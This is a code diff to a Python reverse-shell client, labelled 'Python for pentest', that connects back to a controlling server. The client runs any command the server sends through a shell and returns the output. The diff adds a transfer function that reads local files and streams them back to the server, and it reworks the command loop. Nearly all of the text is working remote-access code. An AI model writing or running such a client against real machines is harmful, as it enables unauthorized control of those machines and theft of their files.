@@ -1,4 +1,7 @@
 ##client.py
+# screen capture
+#Python for pentest
+
 import socket
 import subprocess
 import ctypes
@@ -66,6 +69,17 @@ def letSend(mysocket, path, fileName):
     except Exception as e:
         print(f"[-]Error receiving file: {str(e)}")
 
+def transfer(mysocket, path):
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(5000)
+        while len(packet) > 0:
+            mysocket.send(packet)
+            packet = f.read(1024)
+        f.close()
+        mysocket.send('DONE'.encode())
+    else:
+        mysocket.send('File not found'.encode())
 
 def conn(mysocket):
     # mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -74,11 +88,11 @@ def conn(mysocket):
         # print("[+] Connected to server")
 
         while True:
-            cmd = mysocket.recv(1024).decode()#(errors='ignore')
-            # if not cmd:
-            #     continue
+            cmd = mysocket.recv(1024).decode(errors='ignore').strip()
+            if not cmd:
+                continue
 
-            if 'term' in cmd:
+            if cmd.lower() == "tem":
                 print("[+] Closing connection")
                 mysocket.close()
                 break
@@ -106,25 +120,10 @@ def conn(mysocket):
                     mysocket.send(informToServer.encode())
 
 
-            elif cmd.startswith('send'):
-
-                try:
-                    command, destination, fileName, = cmd.split('*')
-                except ValueError:
-                    print("[-] Invalid send command format. Use: send*<destination>*<filename>")
-                    continue
-                source = input("Source path: ")
-                conn.send(cmd.encode())
-                letSend(conn, source, destination, fileName)
-
-
             else:
-
                 CMD = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                # send back the result
-                mysocket.send(CMD.stdout.read())
-                # send back the error -if any-, such as syntax error
-                mysocket.send(CMD.stderr.read())
+                output, error = CMD.communicate()
+                mysocket.send(output + error)
 
     except Exception as e:
         mysocket.send(f"[-] Error in : {str(e)}".encode())
